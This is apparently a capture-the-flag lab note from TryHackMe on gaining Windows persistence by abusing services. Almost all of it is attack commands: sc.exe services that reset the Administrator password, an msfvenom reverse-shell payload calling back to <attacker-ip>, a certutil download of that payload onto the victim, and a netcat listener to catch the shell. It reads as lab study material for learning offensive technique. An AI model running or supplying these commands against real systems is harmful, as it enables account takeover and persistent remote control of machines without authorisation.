There are two ways we can abuse services to establish persistence: 
- Create a new service
- Modify an existing one 

#### Create and Start a Service name `THMservice`
The command below ***creates and starts a service*** named `THMservice`, ***resetting the Administrator's password*** to `Password123`.
```cmd
sc.exe create THMservice binPath= "net user Administrator Password123" start= auto
sc.exe start THMservice
```
- **`Note: There must be a space after each equal sign for the command to work.`**

---
#### We could also create a reverse shell and associate it with the created service.
```bash
msfvenom -p windows\x64\shell_reverse_tcp LHOST=<attacker-ip> LPORT=4444 -f exe-service -o new-service.exe
```

#### Copy the executable and point the service's `binPath` to it
**Attacker**
```bash
python3 -m http.server
```

**Victim**
```cmd
cd c:\windows
certutil -urlcache -split -f http://<attacker-ip>:8000/new-service.exe
```

```cmd
sc.exe create THMservice2 binPath= "C:\Windows\new-service.exe" start= auto
sc.exe start THMservice2
```

**Create a listener**
```bash
nc -nvlp 4444
```